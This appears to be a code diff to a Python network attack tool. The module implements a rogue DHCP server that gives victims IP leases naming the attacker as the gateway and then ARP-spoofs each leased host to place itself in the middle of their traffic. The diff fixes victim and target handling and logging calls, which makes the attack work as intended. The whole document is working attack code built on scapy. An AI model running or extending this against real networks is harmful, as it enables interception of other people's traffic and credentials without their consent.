@@ -1,6 +1,7 @@
 import util
 from threading import Thread
 from poison import Poison
+from arp import arp
 from zoption import Zoption
 from scapy.all import *
 
@@ -100,21 +101,21 @@ class dhcp(Poison):
                                            'end'])
                     sendp(lease, loop=False)
 
-                    log_msg('Handed \'%s\' out to \'%s\''
+                    util.Msg('Handed \'%s\' out to \'%s\''
                                         % (self.curr_ip, pkt[Ether].src))
                     util.debug('Initializing ARP spoofing...')
-                    tmp = ARPSpoof()
+                    tmp = arp() 
 
-                    victim = (to_ip, getmacbyip(to_ip))
+                    victim = (self.curr_ip, getmacbyip(self.curr_ip))
                     target = (gateway, hw)
                     tmp.victim = victim
-                    tmp.target = self.curr_ip
+                    tmp.target = target
                     if not tmp.initialize_post_spoof() is None:
                         self.spoofed_hosts[self.curr_ip] = tmp
                         util.debug('ARP spoofing successfully configured '
                                                 'for \'%s\'' % self.curr_ip)
                     else:
-                        log_msg('ARP session unsuccessful for %s!  You may not'
+                        util.Msg('ARP session unsuccessful for %s!  You may not'
                          'be able to get in the middle of them!' % self.curr_ip)
                 # discover; send offer
                 elif type(opt) is tuple and opt[1] == 1:
@@ -139,7 +140,7 @@ class dhcp(Poison):
                                            ('router', gateway),
                                             'end'])
                     sendp(offer, loop=False)
-                    log_msg('Sent DHCP offer for \'%s\' to \'%s\''
+                    util.Msg('Sent DHCP offer for \'%s\' to \'%s\''
                                             % (self.curr_ip, pkt[Ether].src))
 
     def view(self):
@@ -150,7 +151,7 @@ class dhcp(Poison):
                                              self.config['gateway'].value
         print '\033[33m[!] Currently Spoofing:\033[0m'
         for key in self.spoofed_hosts:
-            print '\t\033[32m[+] %s\033[0m' % self.spoofed_hosts[key].to_ip
+            print '\t\033[32m[+] %s\033[0m' % str(self.spoofed_hosts[key].victim)
 
         try:
             self.dump_data = True
